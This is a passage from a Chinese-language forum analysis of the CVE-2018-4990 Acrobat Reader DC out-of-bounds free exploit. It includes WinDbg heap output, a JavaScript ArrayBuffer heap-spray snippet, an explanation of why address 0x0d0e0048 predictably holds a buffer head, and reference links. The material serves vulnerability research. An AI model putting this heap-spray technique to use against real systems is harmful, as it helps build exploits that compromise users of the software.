
```
0:010> !heap -flt s fff8

    _HEAP @ 230000

      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state

        ...

        05771ea0 2000 2000  [00]   05771ea8    0fff8 - (busy)

        05781ea0 2000 2000  [00]   05781ea8    0fff8 - (busy)

        05791ea0 2000 2000  [00]   05791ea8    0fff8 - (busy) // 前面申请的 ArrayBufferObject.buffer 并没有遵循这种模式

        057b0040 2000 2000  [00]   057b0048    0fff8 - (busy) // 从这里开始末尾地址模式开始稳定

        057c0040 2000 2000  [00]   057c0048    0fff8 - (busy)

        057d0040 2000 2000  [00]   057d0048    0fff8 - (busy)

        057e0040 2000 2000  [00]   057e0048    0fff8 - (busy)

        057f0040 2000 2000  [00]   057f0048    0fff8 - (busy)

        ...

        0d0a0040 2000 2000  [00]   0d0a0048    0fff8 - (busy)

        0d0b0040 2000 2000  [00]   0d0b0048    0fff8 - (busy)

        0d0c0040 2000 2000  [00]   0d0c0048    0fff8 - (busy)

        0d0d0040 2000 2000  [00]   0d0d0048    0fff8 - (busy)

        0d0e0040 2000 2000  [00]   0d0e0048    0fff8 - (busy) // 0d0e0048 稳定位于某个 ArrayBufferObject.buffer 的 head (buffer - 0x10)

        0d0f0040 2000 2000  [00]   0d0f0048    0fff8 - (busy)

        0d100040 2000 2000  [00]   0d100048    0fff8 - (busy)

        0d110040 2000 2000  [00]   0d110048    0fff8 - (busy)

        ...

```

所以当以如下例子进行堆喷射时，利用编写者几乎可以确定`0x0d0e0048`处一定为某个`ArrayBuffer.buffer` head 的起始处，后面依照这个假定来进行利用。而且 pdf 中 js 对象堆喷射的速度非常快，这些特性都有利于 Adobe Reader 中 UAF/类型混淆等类型的漏洞利用。

```
var spraylen  = 0x10000 - 24;

var spraynum  = 0x1000;

var sprayarr = new Array(spraynum);

sprayarr[0] = 0x12345678;



for(var i = 1; i < spraynum; i++)

{

    sprayarr[i] = new ArrayBuffer(spraylen);

}



app.alert("Allocate ArrayBuffer");

```

## 总结

本文对 CVE-2018-4990 的利用编写者在 Acrobat Reader DC 下借助一个越界释放漏洞实现任意地址读写原语的过程进一步了研究。从这些分析中可以看到利用编写者具体是如何精确地操作堆数据以实现稳定利用。

关于该漏洞在实现任意地址读写原语后进行 ROP 构造的相关细节可以参考[这篇文章](https://bbs.kanxue.com/elink@7ceK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2E0L8%4u0H3K9r3W2K6k6h3y4Q4x3X3g2U0L8$3#2Q4x3V1k6U0M7X3W2@1K9h3y4S2L8q4)9J5k6r3q4D9k6i4u0@1i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5q4)9J5k6o6b7&6z5e0m8Q4x3X3c8S2j5%4u0G2j5X3q4@1i4K6u0V1M7X3g2S2k6r3g2J5i4K6u0V1k6r3y4Q4x3X3c8V1L8%4g2T1L8r3g2Q4x3X3c8X3M7X3g2W2i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5b7`.`.)。

关于该漏洞的其他细节可以参考[这篇](https://bbs.kanxue.com/elink@d22K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1K9g2)9J5k6e0x3$3x3q4)9J5k6h3&6W2N6q4)9J5c8X3u0D9L8$3N6Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8X3q4F1j5h3I4&6M7$3W2K6i4K6u0V1L8$3k6Q4x3X3c8U0N6X3g2Q4x3X3b7J5x3o6p5^5i4K6u0V1y4o6V1&6x3q4)9J5c8R3`.`.)，[这篇](https://bbs.kanxue.com/elink@6adK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7X3y4A6L8X3y4A6N6r3g2Q4x3X3g2A6L8#2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6p5^5i4K6u0r3x3o6g2Q4x3V1j5J5x3g2)9J5c8X3q4V1L8$3u0W2i4K6u0V1L8h3g2Q4x3X3c8S2L8X3c8Q4x3X3c8S2i4K6u0V1k6r3!0#2j5X3I4W2i4K6u0V1k6Y4u0W2k6g2)9J5k6h3S2@1L8h3H3`.)和[这篇](https://bbs.pediy.com/thread-226971.htm)文章。

## 参考链接

[A tale of two zero-days](https://bbs.kanxue.com/elink@a32K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2%4k6h3I4A6N6X3g2K6k6h3y4#2M7X3W2@1P5g2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0S2Q4x3V1j5H3y4g2)9J5c8U0p5#2i4K6u0r3N6r3q4D9k6g2)9J5k6s2c8%4L8#2)9J5k6s2A6W2M7X3!0Q4x3X3c8V1j5i4W2K6i4K6u0r3)

[CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析](https://bbs.kanxue.com/elink@4e3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1K9g2)9J5k6e0x3$3x3q4)9J5k6h3&6W2N6q4)9J5c8X3u0D9L8$3N6Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8X3q4F1j5h3I4&6M7$3W2K6i4K6u0V1L8$3k6Q4x3X3c8U0N6X3g2Q4x3X3b7J5x3o6p5^5i4K6u0V1y4o6V1&6x3q4)9J5c8R3`.`.)

[Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit](https://bbs.kanxue.com/elink@664K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7X3y4A6L8X3y4A6N6r3g2Q4x3X3g2A6L8#2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6p5^5i4K6u0r3x3o6g2Q4x3V1j5J5x3g2)9J5c8X3q4V1L8$3u0W2i4K6u0V1L8h3g2Q4x3X3c8S2L8X3c8Q4x3X3c8S2i4K6u0V1k6r3!0#2j5X3I4W2i4K6u0V1k6Y4u0W2k6g2)9J5k6h3S2@1L8h3H3`.)

[CVE-2018-4990 ACROBAT READER DC DOUBLE-FREE VULNERABILITY](https://bbs.kanxue.com/elink@cd2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2E0L8%4u0H3K9r3W2K6k6h3y4Q4x3X3g2U0L8$3#2Q4x3V1k6U0M7X3W2@1K9h3y4S2L8q4)9J5k6r3q4D9k6i4u0@1i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5q4)9J5k6o6b7&6z5e0m8Q4x3X3c8S2j5%4u0G2j5X3q4@1i4K6u0V1M7X3g2S2k6r3g2J5i4K6u0V1k6r3y4Q4x3X3c8V1L8%4g2T1L8r3g2Q4x3X3c8X3M7X3g2W2i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5b7`.`.)

[CVE-2018-4990 Acrobat Reader堆内存越界访问释放漏洞分析](https://bbs.pediy.com/thread-226971.htm)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-3-28 13:06  
被jq0904编辑，原因：
